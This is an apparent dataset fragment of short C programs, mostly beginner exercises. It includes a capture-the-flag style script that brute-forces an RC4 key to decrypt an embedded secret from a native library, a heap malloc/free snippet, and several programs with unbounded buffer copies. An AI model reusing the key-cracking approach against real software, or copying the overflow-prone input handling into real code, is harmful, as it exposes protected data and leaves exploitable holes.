    "#include <stdio.h>\nint Calculate();\nint main() {\n  int num_failures = Calculate();\n  printf(\"Number of failures = %d\\n\", num_failures);\n  return 0;\n}\nint Calculate() {\n  int count = 0;\n  int fails = 0;\n  double grade = 0.0;\n  double total = 0.0;\n  do {\n    printf(\"How many grades will you be entering? \");\n    scanf(\" %d\", &count);\n  } while (count == 0);\n  for (int i = 0; i < count; i++) {\n    printf(\"Enter grade #%d: \", i + 1);\n    scanf(\" %lf\", &grade);\n    total += grade;\n    if (grade < 65.0) {\n      fails++;\n    }\n  }\n  printf(\"\\nGrade average = %4.2lf\\n\\n\", total / count);\n  return fails;\n}",
    "#include <stdio.h>\nvoid swap(int *a, int *b) {\n  int t = *a;\n  *a = *b;\n  *b = t;\n}\nint partition(int array[], int low, int high) {\n  int pivot = array[high];\n  int i = (low - 1);\n  for (int j = low; j < high; j++) {\n    if (array[j] <= pivot) {\n      i++;\n      swap(&array[i], &array[j]);\n    }\n  }\n  swap(&array[i + 1], &array[high]);\n  return (i + 1);\n}\nvoid quickSort(int array[], int low, int high) {\n  if (low < high) {\n    int pi = partition(array, low, high);\n    quickSort(array, low, pi - 1);\n    quickSort(array, pi + 1, high);\n  }\n}\nvoid printArray(int array[], int size) {\n  for (int i = 0; i < size; ++i) {\n    printf(\"%d  \", array[i]);\n  }\n  printf(\"\\n\");\n}\nint main() {\n  int data[] = {8, 7, 2, 1, 0, 9, 6};\n  int n = sizeof(data) / sizeof(data[0]);\n  quickSort(data, 0, n - 1);\n  printf(\"Sorted array in ascending order: \\n\");\n  printArray(data, n);\n}",
    "#include <stdio.h>\nint main (){\n    int codigo_de_procedencia ;\n    printf(\"digite o codigo de procedencia : \");\n    scanf(\"%d\",&codigo_de_procedencia);\n    if (codigo_de_procedencia == 1){\n        printf(\"Sul\");\n    }else if (codigo_de_procedencia== 2){\n        printf(\"Norte\");\n    }else if (codigo_de_procedencia== 3){\n        printf(\"Leste\");\n    }else if (codigo_de_procedencia== 4){\n        printf(\"Oeste\");\n    }else if (codigo_de_procedencia == 5 || codigo_de_procedencia == 6 ){\n        printf(\"Sudeste\");\n    }else if (codigo_de_procedencia >=7 && codigo_de_procedencia <= 9){\n        printf(\"Nordeste\");\n    }else if (codigo_de_procedencia>= 10 && codigo_de_procedencia <=20 ){\n        printf(\"Centro-oeste\");\n    }else if (codigo_de_procedencia >= 21 && codigo_de_procedencia <= 30 ){\n        printf(\"Nordeste\");\n    }else {\n        printf(\"codigo invalido ! \");\n    }\n    return 0 ;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nunsigned int add4(unsigned int x, _Bool en) {\n    if(en)\n        return x + 4;\n    else\n        return x;\n}\nint main() {\n    printf(\"Output: %d\\n\", add4(5, 1));\n    return 1;\n}",
    "#include <stdio.h>\nint main ()\n{\nint inicial, resto100, resto50, resto20, resto10, resto5, resto2, notas100, notas50, notas20, notas10, notas5, notas2, notas1;\nscanf (\"%d\", &inicial);\nnotas100= inicial/100;\nresto100= inicial%100;\nnotas50= resto100/50;\nresto50= resto100%50;\nnotas20= resto50/20;\nresto20= resto50%20;\nnotas10= resto20/10;\nresto10= resto20%10;\nnotas5= resto10/5;\nresto5= resto10%5;\nnotas2= resto5/2;\nresto2= resto5%2;\nnotas1= resto2/1;\nprintf(\"%d\\n\",inicial);\nprintf(\"%d nota(s) de R$100,00\\n\",notas100);\nprintf(\"%d nota(s) de R$50,00\\n\",notas50);\nprintf(\"%d nota(s) de R$20,00\\n\",notas20);\nprintf(\"%d nota(s) de R$10,00\\n\",notas10);\nprintf(\"%d nota(s) de R$5,00\\n\",notas5);\nprintf(\"%d nota(s) de R$2,00\\n\",notas2);\nprintf(\"%d nota(s) de R$1,00\\n\",notas1);\nreturn 0;\n}",
    "int main() {\n int a = 1;\n int b = 2;\n int c = 4;\n int d = 5;\n return a + b;\n}",
    "#include<stdio.h>\nint main() {\n    int fahr;\n    for (fahr = 0; fahr <= 300; fahr+=20) {\n        printf(\"%d\\t%6.1f\\n\", fahr, (5.0/9.0)*(fahr-32));\n    }\n    return 0;\n}",
    "#include <limits.h>\n#include <stdio.h>\nint reverse(int x)\n{\n int positive = x >= 0 ? 1 : -1;\n long long rev = 0;\n x *= positive;\n while (x > 0) {\n  rev = rev * 10 + x % 10;\n  x /= 10;\n }\n rev *= positive;\n if (rev < (-2147483647 -1) || rev > 2147483647)\n  return 0;\n return rev;\n}\nint main()\n{\n int n = -2147483412;\n reverse(n);\n printf(\"%d\\n\", reverse(n));\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int m,n;\n long long p=1,i;\n scanf(\"%d%d\",&m,&n);\n for(i=m;i>=m-n+1;i--){p*=i;\n }\n for(i=1;i<=n;i++){p/=i;\n }\n printf(\"%lld\",p);\n return 0;\n }",
    "#include <stdio.h>\nint arr[1000000] = {0};\nint bar[1000000];\nint main(void) {\n    return 0;\n}",
    "int main()\n{\n float x;\n int y;\n x = 3.4;\n y = 45.4;\n if(5>6)\n {\n  x=4.5;\n }\n else\n {\n  int z=5*6+5;\n }\n}",
    "#include <stdio.h>\nint main()\n{\n int i,n;\n double k,mid=0,sum=0;\n scanf(\"%d\",&n);\n for (i=1;i<n+1;i++)\n {\n  scanf(\"%lf\",&k);\n  sum+=k;\n  mid=sum/i;\n }\n printf(\"%lf\\n\",mid);\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint flag=0;\nvoid insertion_sort(int profits_sorted[100], int n,int deadlines[100])\n{\n int temp,i,j,a[100];\n for(i=0;i<n;i++)\n    {\n  j=i;\n  while(j>0 && profits_sorted[j-1]>profits_sorted[j])\n        {\n   temp = profits_sorted[j];\n   profits_sorted[j] = profits_sorted[j-1];\n   profits_sorted[j-1] = temp;\n            j--;\n        }\n    }\n    j=0;\n    for(i=n-1;i>=0;i--)\n    {\n     a[j++] = profits_sorted[i];\n    }\n    for(i=0;i<n;i++)\n    {\n     profits_sorted[i] = a[i];\n    }\n}\nvoid recursion_job_sequence(int job_number,int n,int deadlines[100],int job_sequence[100])\n{\n if(job_sequence[n]==-1&&n>0)\n {\n  job_sequence[n] = job_number;\n  flag++;\n  return;\n }\n if(n<=0)\n {\n  flag++;\n  return;\n }\n else\n {\n  recursion_job_sequence(job_number,n-1,deadlines,job_sequence);\n }\n}\nint main()\n{\n int number_of_jobs,total_profit=0,job_profit,job_number,i,n,j;\n int profits[100],deadlines[100],profits_sorted[100],profits_copy[100],job_sequence[100];\n printf(\"Enter the number of jobs : \");\n scanf(\"%d\",&number_of_jobs);\n printf(\"Enter the profits and deadlines for all the jobs\\n\");\n for(i=0;i<number_of_jobs;i++)\n {\n  scanf(\"%d%d\",&profits[i],&deadlines[i]);\n }\n for(i=0;i<number_of_jobs;i++)\n {\n  profits_sorted[i] = profits[i];\n  profits_copy[i] = profits[i];\n }\n for(i=1;i<=number_of_jobs;i++)\n {\n  job_sequence[i] = -1;\n }\n insertion_sort(profits_sorted,number_of_jobs,deadlines);\n i=0;\n while(flag<number_of_jobs)\n {\n  job_profit = profits_sorted[i];\n  for(j=0;j<number_of_jobs;j++)\n  {\n   if(job_profit == profits_copy[j])\n   {\n    profits_copy[j]=-1;\n    job_number = j;\n    break;\n   }\n  }\n  n=deadlines[job_number];\n  recursion_job_sequence(job_number,n,deadlines,job_sequence);\n  i++;\n }\n printf(\"******** JOB SEQUENCE ******** \\n\");\n for(i=1;i<=number_of_jobs;i++)\n {\n  if(job_sequence[i]!=-1)\n   printf(\"Job %d\\n\",job_sequence[i]+1);\n }\n for(i=1;i<=number_of_jobs;i++)\n {\n  if(job_sequence[i]!=-1)\n   total_profit = total_profit + profits[job_sequence[i]];\n }\n printf(\"TOTAL PROFIT = %d\\n\",total_profit);\n return 0;\n}",
    "#include<stdio.h>\nint any(char s1[], char s2[]);\nint main(){\n char s1[] = \"hello world!\";\n char s2[] = \"w\";\n printf(\"s1: %s\\ns2: %s\\n\", s1, s2);\n printf(\"First index of chars in s2 in s1: %d\\n\", any(s1, s2));\n}\nint any(char s1[], char s2[]){\n int i = 0;\n int alphabet[26] = {0};\n int c;\n while((c = s2[i++]) != '\\0'){\n  alphabet[c - 'a'] = 1;\n }\n i = 0;\n while((c = s1[i]) != '\\0'){\n  if (c == ' ') {\n   ;\n  }\n  else if (alphabet[c - 'a'] == 1){\n   return i;\n  }\n  i++;\n }\n return -1;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nchar* key_adjust(unsigned char *key) {\n  key[0xf] ^= 0x42;\n  return key;\n}\nvoid decrypt(unsigned char* enc_cnf,\n              int cnf_len,\n              unsigned char *key,\n              int key_len,\n              unsigned char* output) {\n  int i, j, k;\n  char loopKey[0x100];\n  char table[0x100];\n  key = key_adjust(key);\n  for(k = 0; k < 0x100; k++) {\n    table[k] = k;\n    loopKey[k] = key[k % key_len];\n  }\n  int x, y, ofs;\n  char tmp;\n  x = 0;\n  for(j = 0; j < 0x100; j++) {\n    x = (x + table[j] + loopKey[j]) & 0xff;\n    tmp = table[x];\n    table[x] = table[j];\n    table[j] = tmp;\n  }\n  x = 0; y = 0;\n  for(i = 0; i < cnf_len; i++) {\n    y = (y + 1) & 0xff;\n    x = (x + table[y]) & 0xff;\n    tmp = table[x];\n    table[x] = table[y];\n    table[y] = tmp;\n    ofs = (table[y] + table[x]) & 0xff;\n    output[i] = enc_cnf[i] ^ table[ofs];\n  }\n}\nint main() {\n  FILE *fp = fopen(\"libnative-lib.so\", \"rb\");\n  char buf[0xb0];\n  char output[0xb0];\n  char key[0x11] = \"????1STEALCOINZ!\\x00\";\n  fseek(fp, 0xd84, (0));\n  fread(buf, 0x81, 1, fp);\n  fclose(fp);\n  char a, b, c, d;\n  for(a = 'a'; a <= 'z'; a++) {\n    key[0] = a;\n    for(b = 'a'; b <= 'z'; b++) {\n      key[1] = b;\n      for(c = 'a'; c <= 'z'; c++) {\n        key[2] = c;\n        for(d = 'a'; d <= 'z'; d++) {\n          key[3] = d;\n          decrypt(buf, 0x81, key, 0x10, output);\n          if (strstr(output, \"flag\")) {\n            printf(\"%s\\n\", key);\n            printf(\"%s\\n\", output);\n            exit(0);\n          }\n        }\n      }\n    }\n  }\n  puts(\"Not found!\");\n}",
    "#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <time.h>\nint main(void)\n{\n  char path[80];\n  int i=0;\n  int fd=0;\n  system(\"mkdir -p /tmp/testing/a/b/c/d/e/f/g\");\n  for(i=0; i<50; i++)\n  {\n    fd = open(\"/tmp/testing/a/b/c/d/e/f/g\", (0x04000000));\n    fchdir(fd);\n    close(fd);\n    getcwd(path, 80);\n    printf(\"%i - %s\\n\",i,path);\n  }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n char *a = malloc(0x200);\n free(a);\n char *b = malloc(0x8);\n}",
    "#include <stdio.h>\nvoid rotate( int arr[],int arr_size, int arr_rot);\n void print_arr(int arr[], int n);\nint main() {\n int test_case, arr_size, arr_rot,arr[100],i;\n printf(\"hello\");\n scanf(\"%d\",&test_case);\n scanf(\"%d %d\",&arr_size,&arr_rot);\n for(int i =0;i<arr_size-1;i++)\n {\n     scanf(\"%d\",&arr[i]);\n }\nprintf(\"Before rotation \\n\");\n print_arr(arr,arr_size);\nfor(i=0;i<arr_rot;i++){\nrotate(arr,arr_size,arr_rot);\n}\n  printf(\"after rotation \\n\");\n  print_arr(arr,arr_size);\n return 0;\n}\nvoid rotate( int arr[], int arr_size, int arr_rot){\n int i ;\n int temp = arr[0];\n for (i=0; i<arr_size-1;i++){\n arr[i]=arr[i+1];\n  arr[arr_size-1]=temp;\n }\n}\n void print_arr(int arr[], int size)\n{\n for (int i = 0; i < size-1 ; i++)\n {\n  printf(\"%d-> \",arr[i]);\n }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <string.h>\nstatic void usage(void);\nuint16_t sx1302_lora_payload_crc(const uint8_t * data, uint8_t size);\nvoid remove_spaces(char *str);\nint main(int argc, char ** argv)\n{\n    int j;\n    uint8_t payload[255];\n    uint8_t payload_size;\n    uint16_t crc;\n    char hexstr[1024];\n    if (argc < 2) {\n        usage();\n        return -1;\n    }\n    memcpy(hexstr, argv[1], strlen(argv[1]));\n    hexstr[strlen(argv[1])] = '\\0';\n    printf(\"Input hex string: %s\\n\", hexstr);\n    remove_spaces(hexstr);\n    hexstr[strlen(hexstr)] = '\\0';\n    printf(\"Removing spaces: %s\\n\", hexstr);\n    payload_size = strlen(hexstr) / 2;\n    for (j = 0; j < payload_size; j++) {\n        sscanf(hexstr + 2*j, \"%02hhx\", &payload[j]);\n    }\n    crc = sx1302_lora_payload_crc(payload, payload_size);\n    printf(\"Payload CRC_16: %04X\\n\", crc);\n    return 0;\n}\nvoid usage(void) {\n    printf(\"Missing payload hex string\\n\");\n}\nvoid remove_spaces(char *str)\n{\n    int count = 0;\n    for (int i = 0; str[i]; i++) {\n        if (str[i] != ' ') {\n            str[count++] = str[i];\n        }\n    }\n    str[count] = '\\0';\n}\nvoid lora_crc16(const char data, int *crc) {\n    int next = 0;\n    next = (((data>>0)&1) ^ ((*crc>>12)&1) ^ ((*crc>> 8)&1) ) ;\n    next += ((((data>>1)&1) ^ ((*crc>>13)&1) ^ ((*crc>> 9)&1) )<<1 ) ;\n    next += ((((data>>2)&1) ^ ((*crc>>14)&1) ^ ((*crc>>10)&1) )<<2 ) ;\n    next += ((((data>>3)&1) ^ ((*crc>>15)&1) ^ ((*crc>>11)&1) )<<3 ) ;\n    next += ((((data>>4)&1) ^ ((*crc>>12)&1) )<<4 ) ;\n    next += ((((data>>5)&1) ^ ((*crc>>13)&1) ^ ((*crc>>12)&1) ^ ((*crc>> 8)&1))<<5 ) ;\n    next += ((((data>>6)&1) ^ ((*crc>>14)&1) ^ ((*crc>>13)&1) ^ ((*crc>> 9)&1))<<6 ) ;\n    next += ((((data>>7)&1) ^ ((*crc>>15)&1) ^ ((*crc>>14)&1) ^ ((*crc>>10)&1))<<7 ) ;\n    next += ((((*crc>>0)&1) ^ ((*crc>>15)&1) ^ ((*crc>>11)&1) )<<8 ) ;\n    next += ((((*crc>>1)&1) ^ ((*crc>>12)&1) )<<9 ) ;\n    next += ((((*crc>>2)&1) ^ ((*crc>>13)&1) )<<10) ;\n    next += ((((*crc>>3)&1) ^ ((*crc>>14)&1) )<<11) ;\n    next += ((((*crc>>4)&1) ^ ((*crc>>15)&1) ^ ((*crc>>12)&1) ^ ((*crc>> 8)&1))<<12) ;\n    next += ((((*crc>>5)&1) ^ ((*crc>>13)&1) ^ ((*crc>> 9)&1) )<<13) ;\n    next += ((((*crc>>6)&1) ^ ((*crc>>14)&1) ^ ((*crc>>10)&1) )<<14) ;\n    next += ((((*crc>>7)&1) ^ ((*crc>>15)&1) ^ ((*crc>>11)&1) )<<15) ;\n    (*crc) = next;\n}\nuint16_t sx1302_lora_payload_crc(const uint8_t * data, uint8_t size) {\n    int i;\n    int crc = 0;\n    for (i = 0; i < size; i++) {\n        lora_crc16(data[i], &crc);\n    }\n    return (uint16_t)crc;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n\nint main(int argc, char *argv[])\n{\n    int M = atoi(argv[1]);\n    char alphabet[36] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g',\n                        'h', 'i', 'j', 'k', 'l', 'm', 'n',\n                        'o', 'p', 'q', 'r', 's', 't', 'u',\n                        'v', 'w', 'x', 'y', 'z' , '0', '1',\n                        '2', '3', '4', '5', '6', '7', '8', '9'};\n    for (int i = 0; i < M; i++){\n        printf(\"%c\", alphabet[rand() % 36]);\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    char first[20], second[20];\n    int lenf, lens;\n    printf(\"Enter first string.\\n\");\n    scanf(\"%s\", first);\n    printf(\"Enter second string.\\n\");\n    scanf(\"%s\", second);\n    for (lenf = 0; first[lenf] != '\\0'; ++lenf)\n        ;\n    lens = 0;\n    while (second[lens] != '\\0')\n    {\n        first[lenf] = second[lens];\n        lenf++;\n        lens++;\n    }\n    first[lenf] = '\\0';\n    printf(\"The combined string is %s\\n\", first);\n    return 0;\n}",
    "#include <stdint.h>\n\nvoid uart_tx(const char c) {\n    volatile uint8_t* uartTxPtr = (volatile uint8_t*)(0x10000000);\n    *uartTxPtr = (uint8_t)c;\n}\nvoid print(const char* str) {\n    for(int i = 0 ; str[i] != '\\0' ; ++i) {\n        uart_tx(str[i]);\n    }\n}\nint main(void) {\n    const char* hello = \"Hello RISC-V! \\n\";\n    print(hello);\n    return 0;\n}",
    "#include <stdio.h>\ndouble fact(int m);\nint main(void)\n{\n    int n;\n    double f;\n    printf(\"Input n: \");\n    scanf(\"%d\", &n);\n    f = fact(n);\n    printf(\"%d!=%f\\n\", n, f);\n    return 0;\n}\ndouble fact(int m)\n{\n    int i;\n    double product=1;\n    for ( i = 1; i <= m; i++ )\n    product = product * i;\n    return product;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(void)\n{\n    int number, right_digit, i;\n    printf(\"Enter a number: \");\n    scanf(\"%i\", &number);\n    int num_of_digits = floor(log10(abs(number))) + 1;\n    int number_array[num_of_digits];\n    for (i = 0; i < num_of_digits; i++) {\n        right_digit = number % 10;\n        number /= 10;\n        number_array[i] = right_digit;\n    }\n    for (i = num_of_digits - 1; i >= 0; i--) {\n        switch (number_array[i]) {\n            case 0:\n                printf(\"zero \");\n                break;\n            case 1:\n                printf(\"one \");\n                break;\n            case 2:\n                printf(\"two \");\n                break;\n            case 3:\n                printf(\"three \");\n                break;\n            case 4:\n                printf(\"four \");\n                break;\n            case 5:\n                printf(\"five \");\n                break;\n            case 6:\n                printf(\"six \");\n                break;\n            case 7:\n                printf(\"seven \");\n                break;\n            case 8:\n                printf(\"eight \");\n                break;\n            case 9:\n                printf(\"nine \");\n                break;\n            default:\n                printf(\"%i\", number_array[i]);\n                break;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\nprintf(\"2 == 2 devuelve %i \\n\",2==2);\nprintf(\"2 !== 2 devuelve %i \\n\",2!=2);\nprintf(\"2 > 2 devuelve %i \\n\",2>2);\nprintf(\"2 < 2 devuelve %i \\n\",2<2);\nprintf(\"2 <= 2 devuelve %i \\n\",2<=2);\nprintf(\"2 !== 2 devuelve %i \\n\",2>=2);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid swap(int *x, int *y)\n{\n    int m = *x;\n    *x = *y;\n    *y = m;\n}\nint pyramid_sort(int *array, int n)\n{\n    int b, s, i;\n    while (1)\n    {\n        b = 0;\n        for (i = 0; i < n; ++i)\n        {\n            if (i * 2 + 2 + s < n)\n            {\n                if (array[i + s] > array[i * 2 + 1 + s] || array[i + s] > array[i * 2 + 2 + s])\n                {\n                    if (array[i * 2 + 1 + s] < array[i * 2 + 2 + s])\n                    {\n                        swap(&array[i + s], &array[i * 2 + 1 + s]);\n                        b = 1;\n                    }\n                    else if (array[i * 2 + 2 + s] < array[i * 2 + 1 + s])\n                    {\n                        swap(&array[i + s], &array[i * 2 + 2 + s]);\n                        b = 1;\n                    }\n                }\n            }\n            else if (i * 2 + 1 + s < n)\n            {\n                if (array[i + s] > array[i * 2 + 1 + s])\n                {\n                    swap(&array[i + s], &array[i * 2 + 1 + s]);\n                    b = 1;\n                }\n            }\n        }\n        if (!b)\n            s++;\n        if (s + 2 == n)\n            break;\n    }\n    return 0;\n}\nint main()\n{\n    int n, i;\n    scanf(\"%d\",&n);\n    int *array = malloc(sizeof(int) * n);\n    for (i = 0; i < n; i++)\n        scanf(\"%d\",&array[i]);\n    int first = 0, last = n - 1;\n    pyramid_sort(array, n);\n    for (i = 0; i < n; i++)\n        printf(\"%d \", array[i]);\n    printf(\"\\n\");\n    free(array);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int * ptr;\n    int torf[2][2]={{12},{14,16}};\n    ptr=torf[0];\n    printf(\"*ptr = %d\\n\",*ptr);\n    printf(\"torf[0][0] = %d\\n\",torf[0][0]);\n    printf(\"*(ptr+2) = %d\\n\",*(ptr+2));\n    printf(\"torf[1][0] = %d\\n\",torf[1][0]);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc,char *argv[])\n{\n    FILE *fp;\n    void filecopy(FILE *, FILE *);\n    if(argc==1)\n        filecopy((stdin),(stdout));\n    else\n        while(--argc>0)\n            if((fp=fopen(*++argv,\"r\"))==((void*)0))\n            {\n                printf(\"cat:catn't open %s\\n\",*argv);\n                return 1;\n            }\n            else\n            {\n                filecopy(fp,(stdout));\n                fclose(fp);\n            }\n    return 0;\n}\nvoid filecopy(FILE *ifp,FILE *ofp)\n{\n    int c;\n    while((c=getc(ifp))!=(-1))\n        putc(c,ofp);\n}",
    "#include<stdio.h>\nint main(){\n int age;\n printf(\"Enter your age: \");\n scanf(\"%d\",&age);\n if(age>=18)\n  printf(\"\\nYou are eligile to vote.\\n\");\n else\n  printf(\"\\nYou are not eligible to vote\\n\");\n}",
    "#include<stdio.h>\nint main(){\n    int a,b;\n    while(scanf(\"%x %x\",&a,&b)!=(-1)){\n        printf(\"%d\\n\",a+b);\n    }\n}",
    "#include <stdlib.h>\n#include <errno.h>\n#include <stdio.h>\n#include <string.h>\nchar buf[1024];\nint main(int argc, char **argv)\n{\n int count = 1;\n while ((argc >= 2 && count < argc) || argc < 2) {\n  char *stringParsed;\n  if (argc >= 2) {\n   stringParsed = argv[count++];\n  } else {\n   char *ptr = fgets(buf, 1024, (stdin));\n   if (!ptr) {\n    return 0;\n   }\n   stringParsed = buf;\n  }\n  for (unsigned long i = 0; i < strlen(stringParsed); i++) {\n   printf(\"%d \", (int)stringParsed[i]);\n  }\n  putchar('\\n');\n }\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    char c = 110;\n    short s;\n    float f;\n    s = c + 10;\n    printf(\"s: %d\\n\", s);\n    f = c;\n    printf(\"f: %f\\n\", f);\n    f = 15.8;\n    s = f;\n    printf(\"f: %f \\t s: %d\\n\", f, s);\n}",
    "#include <stdio.h>\n#include <math.h>\nint swap(int* a, int* b) {\n    int aux = *a;\n    *a = *b;\n    *b = aux;\n}\nint main() {\n    int n[3];\n    scanf(\"%d %d %d\", n+0, n+1, n+2);\n    int m[3];\n    int i;\n    for (i = 0; i < 3; i++) {\n        m[i] = n[i];\n    }\n    if (n[2] < n[0]) swap(n+0, n+2);\n    if (n[2] < n[1]) swap(n+1, n+2);\n    if (n[1] < n[0]) swap(n+0, n+1);\n    for (i = 0; i < 3; i++) {\n        printf(\"%d\\n\", n[i]);\n    }\n    printf(\"\\n\");\n    for (i = 0; i < 3; i++) {\n        printf(\"%d\\n\", m[i]);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main() {\n        float a,b;\n        scanf(\"%f%f\", &a,&b);\n        if (a<=b)\n        {\n            printf(\"a<b\");\n        }\n        else if (a==b)\n        {\n            printf(\"a=b\");\n        }\n        else\n        {\n            printf(\"a>b\");\n        }\n    return 0;\n}",
    "int data_test = 15;\nint main(void)\n{\n while(1)\n {\n  data_test++;\n }\n}",
    "#include <stdio.h>\nint main(void)\n{\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(void){\n    int npalpites;\n    int palpites;\n     npalpites=0;\n    printf(\"Digite seu palpite: \");\n    scanf(\"%d\",&palpites);\n    npalpites+=1;\n    while(palpites!=5){\n        printf(\"Digite seu novo palpite #%d:\",npalpites+1);\n        scanf(\"%d\",&palpites);\n        npalpites+=1;\n        if(palpites==5){\n            printf(\"Voce ganhou\");\n    }else{\n            printf(\"Voce perdeu\");\n    }\n    }\n    printf(\"Foram dados %d palpites\",npalpites);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nstatic void unescape(char *p) {\n    for (; *p; p++) {\n        if (*p != '\\\\' || p[1] == '\\0') {\n            printf(\"%c\", *p);\n            continue;\n        }\n        p++;\n        if (*p == 'n')\n            printf(\"\\n\");\n        else if (*p == 't')\n            printf(\"\\t\");\n        else\n            printf(\"\\\\%c\", *p);\n    }\n}\nint main(int argc, char **argv) {\n    if (argc == 1)\n        return 0;\n    char **args = argv + 1;\n    if (strcmp(args[0], \"-e\") == 0) {\n        args++;\n        for (char **p = args; *p; p++) {\n            if (p != args)\n                printf(\" \");\n            unescape(*p);\n        }\n    } else {\n        for (char **p = args; *p; p++)\n            printf(\"%s%s\", (p == args ? \"\" : \" \"), *p);\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "int main() {\n  int **a;\n  int *b;\n  int c = 33;\n  b = &c;\n  a = &b;\n  int ***d = &a;\n  return **a;\n}",
    "#include <stdio.h>\nint main(void) {\n    while (1) {\n        float temp;\n        puts(\"Graus Celsius:\");\n        scanf(\"%f\", &temp);\n        printf(\"\\nCelsius: %.1f\\nFahrenheit: %.1f\\n\", temp, temp * 1.8 + 32);\n        puts(\"Digite 1 para sair ou 2 para uma nova conversao...\\n\");\n        int sair;\n        scanf(\"%d\", &sair);\n        if (sair == 1) break;\n    }\n}",
    "#include <stdio.h>\nvoid temperature_print(float start_temp, float end_temp, float step);\nint main()\n{\n temperature_print(0, 19, 1);\n return 0;\n}\nvoid temperature_print(float start_temp, float end_temp, float step)\n{\n printf(\"%10s %10s\\n\", \"Celsius\", \"Fahrenheit\");\n for (;start_temp <= end_temp;start_temp += step)\n {\n  float cel_to_fah = start_temp * (9.0 / 5.0) + 32.0;\n  printf(\"%10.1f %10.1f\\n\", start_temp, cel_to_fah);\n }\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\n#include <time.h>\nvoid quick_sort(int s[], int l, int r)\n{\n  if (l < r)\n  {\n    int i = l, j = r, x = s[l];\n    while (i < j)\n    {\n      while(i < j && s[j] <= x)\n      j--;\n      if(i < j)\n      s[i++] = s[j];\n      while(i < j && s[i] > x)\n      i++;\n      if(i < j)\n      s[j--] = s[i];\n    }\n    s[i] = x;\n    quick_sort(s, l, i - 1);\n    quick_sort(s, i + 1, r);\n  }\n}\nint main() {\n  clock_t start,finish;\n  double TheTimes;\n  start=clock();\n  int N, K;\n  scanf(\"%d\", &N);\n  scanf(\"%d\", &K);\n  int arr[N];\n  for(int i = 0; i < N; i++) {\n    scanf(\"%d\",&arr[i]);\n  }\n  quick_sort(arr, 0, N - 1);\n  finish=clock();\n  TheTimes=(double)(finish-start)/((clock_t)1000000000);\n  long long unfair = 0;\n  long long min = 0;\n  long long offset = 0;\n  long long tmp = 0;\n  long long * d = malloc(sizeof(long long) * N);\n  memset(d, 0, sizeof(long long) * N);\n  for (int i = 1; i < N; i ++) {\n    d[i] = arr[i - 1] - arr[i];\n    if (i < K) {\n      unfair += d[i] * (K - i) * i;\n      min = unfair;\n      offset += d[i] * (K - 1 - 2 * (i - 1));\n    }\n    else {\n      offset -= d[i] * (K - 1);\n      if (i > K) {\n        offset -= d[i - K] * (K - 1);\n        offset += 2 * tmp;\n      }\n      unfair -= offset;\n      if (min > unfair) {\n        min = unfair;\n      }\n    }\n    if (i > 1) {\n      tmp += d[i];\n    }\n    if (i > K) {\n      tmp -= d[i - K + 1];\n    }\n  }\n  printf(\"%lld\\n\", min);\n  finish=clock();\n  TheTimes=(double)(finish-start)/((clock_t)1000000000);\n  return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main(){\n    double num, maior, menor;\n    printf(\"Calculadora de maior e menor numero, dentre 10 numeros\");\n    printf(\"\\nDigite o numero: \");\n    scanf(\"%lf\", &num);\n    maior = num;\n    menor = num;\n    for(int i = 0; i < 9; i++){\n        printf(\"\\nDigite outro numero: \");\n        scanf(\"%lf\", &num);\n        if(num >= maior){\n            maior = num;\n        }\n        else if (num <= menor) {\n            menor = num;\n        }\n        }\n        printf(\"O maior numero e %.2f e o menor numero e %.2f\\n\", maior, menor);\n    }",
    "#include <stdio.h>\n#include <stdbool.h>\nint main() {\n  int s, f, t, chicken, rabbit, crab;\n  scanf(\"%d%d%d\", &s, &f, &t);\n  crab = s - t;\n  rabbit = (f - 8 * crab) / 2 - t;\n  chicken = s - (rabbit + crab);\n  _Bool valid;\n  if (chicken >= 0 && rabbit >= 0 && crab >= 0 && ((f - 8 * crab) % 2) == 0) {\n    valid = 1;\n    printf(\"%d\\n%d\\n%d\", chicken, rabbit, crab);\n  } else {\n    valid = 0;\n    printf(\"0\");\n  }\n  return 0;\n}",
    "#include <stdio.h>\n\n\n\nint main() {\n    for (int fahr = 0; fahr < 300; fahr += 20) {\n        printf(\"%3d %6.1f\\n\", fahr, (5.0f / 9.0f) * (fahr - 32));\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid runYear() {\n    int year = 2000;\n    while (year<=2500) {\n        if (year%4==0 && year%100!=0) {\n            printf(\"\u95f0\u5e74year -- %d\\n\",year);\n        } else if (year%400==0){\n            printf(\"\u95f0\u5e74year -- %d\\n\",year);\n        }\n        year ++;\n    }\n}\nint main(int argc, const char * argv[]) {\n    runYear();\n    return 0;\n}",
